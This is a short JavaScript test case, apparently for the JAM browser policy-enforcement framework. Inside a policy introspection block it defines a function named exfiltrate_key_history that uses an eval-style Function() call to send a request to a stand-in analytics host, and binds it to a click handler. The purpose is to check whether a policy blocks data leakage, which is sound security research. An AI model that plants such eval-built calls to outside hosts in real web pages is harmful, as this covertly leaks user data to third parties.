
JAM.startProfile('load');
introspect(JAM.policy.pFull) {
function exfiltrate_key_history() {
  Function('xmlhttp=new XMLHttpRequest();xmlhttp.open("GET", "http://AnalyticsInc:8000/submission.html?test=func_encodesel", true);xmlhttp.send(null);')()
}
document.getElementById("test").onclick = exfiltrate_key_history;

}

JAM.stopProfile('load');
